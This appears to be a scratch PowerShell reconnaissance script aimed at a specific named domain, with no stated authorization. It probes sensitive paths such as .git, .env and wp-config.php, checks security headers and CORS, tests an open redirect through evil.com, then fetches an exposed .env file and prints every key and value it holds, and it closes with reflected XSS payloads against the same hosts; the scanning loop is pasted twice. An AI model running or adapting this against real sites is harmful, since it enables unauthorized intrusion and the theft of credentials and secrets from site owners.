
$TargetURL = "halo.tsg.com"
$Endpoints = @("/.git/", "/.env", "/config.php", "/backup.zip", "/wp-config.php", "/admin", 
    "/robots.txt", "/sitemap.xml", "/login", "/register", "/users", "/search")

$Headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }


Write-Host "[*] Scanning $TargetURL for security risks..." -ForegroundColor Yellow

$Findings = @()

foreach ($Endpoint in $Endpoints) {
    $FullURL = "$TargetURL$Endpoint"
    try {
        $Response = Invoke-WebRequest -Uri $FullURL -Headers $Headers -TimeoutSec 5 -ErrorAction Stop
        Write-Host "[+] Found: $FullURL (Status: $($Response.StatusCode))" -ForegroundColor Green
        $Findings += "[+] Exposed: $FullURL"
    } catch {
        if ($_.Exception.Response.StatusCode -eq 403) {
            Write-Host "[-] Forbidden: $FullURL (403)" -ForegroundColor Red
        } elseif ($_.Exception.Response.StatusCode -eq 404) {
            Write-Host "[x] Not Found: $FullURL" -ForegroundColor Gray
        } else {
            Write-Host "[!] Error: $FullURL - $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

# Scan for Exposed Files & Endpoints
foreach ($Endpoint in $Endpoints) {
    $FullURL = "$TargetURL$Endpoint"
    try {
        $Response = Invoke-WebRequest -Uri $FullURL -Headers $Headers -TimeoutSec 5 -ErrorAction Stop
        Write-Host "[+] Found: $FullURL (Status: $($Response.StatusCode))" -ForegroundColor Green
        $Findings += "[+] Exposed: $FullURL"
    } catch {
        if ($_.Exception.Response.StatusCode -eq 403) {
            Write-Host "[-] Forbidden: $FullURL (403)" -ForegroundColor Red
        } elseif ($_.Exception.Response.StatusCode -eq 404) {
            Write-Host "[x] Not Found: $FullURL" -ForegroundColor Gray
        } else {
            Write-Host "[!] Error: $FullURL - $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

# Check Security Headers
Write-Host "`n[*] Checking security headers..." -ForegroundColor Yellow
$Response = Invoke-WebRequest -Uri $TargetURL -Headers $Headers -TimeoutSec 5

$MissingHeaders = @()
$SecurityHeaders = @("Strict-Transport-Security", "X-Frame-Options", "X-Content-Type-Options", "Content-Security-Policy")

foreach ($Header in $SecurityHeaders) {
    if (-not $Response.Headers[$Header]) {
        Write-Host "[!] Missing: $Header" -ForegroundColor Red
        $MissingHeaders += "[!] Missing: $Header"
    }
}

# Check CORS Policy
if ($Response.Headers["Access-Control-Allow-Origin"] -eq "*") {
    Write-Host "[!] Weak CORS policy detected (allows all origins)." -ForegroundColor Red
    $MissingHeaders += "[!] Weak CORS: Access-Control-Allow-Origin=*"
}

# Check Open Redirects
$RedirectTestURL = "$TargetURL/logout?redirect=https://evil.com"
try {
    Invoke-WebRequest -Uri $RedirectTestURL -Headers $Headers -TimeoutSec 5 -MaximumRedirection 10
} catch {
    if ($_.Exception.Response.StatusCode -eq 302) {
        Write-Host "[!] Possible Open Redirect at $RedirectTestURL" -ForegroundColor Red
        $MissingHeaders += "[!] Open Redirect Found: $RedirectTestURL"
    }
}

# Save Findings to File
$Findings | Out-File -FilePath "WebScan_Report.txt"
Write-Host "`n[*] Scan Completed. Report saved to WebScan_Report.txt" -ForegroundColor Cyan


# Target URL of the exposed .env file
$target = "http://halo.tsg.com/.env"

# Send the request
$response = Invoke-WebRequest -Uri $target -UseBasicParsing -ErrorAction SilentlyContinue

# Check if we got a valid response
if ($response.StatusCode -eq 200 -and $response.Content) {
    Write-Host "[+] .env file found and accessible!" -ForegroundColor Green
    
    # Parse key-value pairs
    $lines = $response.Content -split "`n"
    foreach ($line in $lines) {
        if ($line -match '^\s*([^#=]+)\s*=\s*(.+)$') {
            $key = $matches[1].Trim()
            $value = $matches[2].Trim()
            Write-Host "$key = $value"
        }
    }
} else {
    Write-Host "[-] Could not access .env file or file not found." -ForegroundColor Red
}


Invoke-WebRequest -Uri "http://tsg.com" -UseBasicParsing | Select-Object -ExpandProperty Headers

Invoke-WebRequest -Uri "http://tsg.com" -UseBasicParsing | Select-Object -ExpandProperty Content

http://tsg.com/?search=<script>alert(1)</script>

http://halo.tsg.com/?search=<script>alert(1)</script>
